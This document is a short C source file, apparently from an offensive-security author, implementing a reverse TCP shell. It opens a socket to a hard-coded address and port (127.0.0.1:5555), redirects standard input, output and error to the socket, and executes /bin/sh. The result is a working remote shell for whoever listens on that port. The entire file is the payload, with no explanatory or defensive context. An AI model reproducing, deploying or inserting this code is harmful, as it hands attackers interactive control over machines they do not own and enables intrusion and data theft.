//Author: sagar.offsec (VL43CK)
//Name: reverseTCP.c
//Website: https://sagaroffsec.com

#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>

int main ()
{
    const char* ip = "127.0.0.1";
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(5555);
    inet_aton(ip, &addr.sin_addr);

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));

    for (int i = 0; i < 3; i++)
    {
        dup2(sockfd, i);
    }

    execve("/bin/sh", NULL, NULL);

    return 0;
}
